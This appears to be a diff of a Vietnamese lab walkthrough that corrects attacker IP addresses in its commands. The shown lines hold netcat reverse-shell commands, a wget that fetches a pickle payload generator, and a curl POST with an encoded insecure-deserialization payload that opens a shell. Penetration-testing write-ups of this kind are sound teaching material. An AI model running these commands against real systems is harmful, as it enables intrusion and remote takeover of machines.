@@ -57,7 +57,7 @@ Git clone code trên trang github trên về máy kali
 
 Nhập command reverse shell: tạo ra một kết nối từ victim machine đến attacker machine, thông qua đó attacker có thể kiểm soát và thực thi các lệnh trên victim machine. Khi thực hiện được kết nối này, attacker có thể truy cập vào các tài nguyên và dữ liệu trên victim machine, và có thể thực hiện các hành động như cài đặt phần mềm độc hại, lấy mật khẩu và tạo backdoor để giữ lâu dài quyền kiểm soát truy cập vào victim machine.
 
->nc 10.0.255 4444 /bin/bash
+>nc 10.0.2.5 4444 /bin/bash
 
 Sau đó đọc thông tin trong database.php
 
@@ -90,7 +90,7 @@ Có thể thấy nó bị dính lỗi Insecure Deserialization
 Command exploit
 >wget https://gist.githubusercontent.com/kriss-u/085569495cb930e398759c0cbf45e3b7/raw/15fe119ed307ac69673bcaadd9fab84c32a85a00/pickle-payload-py3.py
 
->python3 pickle-payload-py3.py "nc 10.0.2. 9999 -e /bin/bash"
+>python3 pickle-payload-py3.py "nc 10.0.2.5 9999 -e /bin/bash"
 
 >curl -d "awesome=gASVOQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB5uYyAxMC4wLjIuMTUgOTk5OSAtZSAvYmluL2Jhc2iUhZRSlC4=" -X POST http://127.0.0.1:5000/heaven
 
